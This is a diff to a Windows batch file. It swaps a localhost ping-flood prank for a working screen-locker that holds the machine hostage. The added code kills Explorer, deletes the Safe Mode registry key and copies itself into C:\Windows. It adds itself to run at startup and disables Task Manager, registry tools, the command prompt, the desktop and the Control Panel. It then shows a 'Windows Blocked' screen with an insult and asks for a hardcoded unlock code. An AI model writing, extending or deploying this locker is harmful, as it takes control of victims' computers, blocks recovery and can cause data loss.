@@ -1,18 +1,33 @@
 @echo off
-title VIRUS
-color 4
-chcp 1251 >nul
-msg * "Прощай ламер!"
-chcp 866 >nul
-echo Gudbai lamer!
-start ping -n 100 -w 1000 -t -l 65500 127.0.0.1
-start ping -n 100 -w 1000 -t -l 65500 127.0.0.1
-start ping -n 100 -w 1000 -t -l 65500 127.0.0.1
-start ping -n 100 -w 1000 -t -l 65500 127.0.0.1
-start ping -n 100 -w 1000 -t -l 65500 127.0.0.1
-start ping -n 100 -w 1000 -t -l 65500 127.0.0.1
-start ping -n 100 -w 1000 -t -l 65500 127.0.0.1
-start ping -n 100 -w 1000 -t -l 65500 127.0.0.1
-start ping -n 100 -w 1000 -t -l 65500 127.0.0.1
-start ping -n 100 -w 1000 -t -l 65500 127.0.0.1
-ping -n 100 -w 1000 -t -l 65500 127.0.0.1
+color c
+taskkill /im explorer.exe /f > nul
+Reg Delete HKLM\System\CurrentControlSet\Control\SafeBoot /f > nul
+copy %0 C:\Windows\Win32.bat > nul
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Win32 /t REG_SZ /d C:\Windows\Win32.bat /f
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f > nul
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools /t REG_DWORD /d 1 /f >nul
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableCMD/t REG_DWORD/d 2 /f > nul
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoDesktop /t REG_DWORD /d 1 /f >nul
+reg add HKCU\Software\Microsoft\Windows\Current Version\Policies\Explorer/v NoControlPanel /t REG_DWORD /d 1 /f >nul
+cls
+title Windows blocked
+echo Windows Blocked!
+echo Suck dick >Very Happy
+echo Enter C0d3:
+:upo
+set /p x=
+if %x%==53614621341322563173 (echo Windows start!
+start explorer
+reg Delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f > nul
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 0 /f > nul
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools /t REG_DWORD /d 0 /f >nul
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableCMD/t REG_DWORD/d 0 /f > nul
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoDesktop /t REG_DWORD /d 0 /f >nul
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer/v NoControlPanel /t REG_DWORD /d 0 /f >nul
+exit
+) ELSE (
+cls
+echo ERROR!
+echo Enter C0d3:
+)
+goto upo
